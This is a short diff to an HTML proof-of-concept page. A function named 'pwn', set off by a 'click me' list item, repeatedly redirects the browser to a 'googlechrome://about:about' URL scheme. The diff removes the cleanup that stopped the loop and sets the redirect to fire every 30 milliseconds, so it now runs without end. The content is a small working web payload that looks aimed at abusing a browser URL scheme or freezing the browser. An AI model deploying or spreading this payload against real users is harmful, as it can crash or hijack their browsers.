@@ -1,11 +1,7 @@
 
 	<script>
 	    function pwn() {
-	        v = setInterval(`x=document.location='googlechrome://about:about'`);
-
-	        i = setInterval(`	            clearInterval(v);
-	            clearInterval(i);
-	            `, 2333);
+	        v = setInterval(`x=document.location='googlechrome://about:about'`, 30);
 	    }
 	</script>
 	<li onclick="pwn();">step1: click me</li>
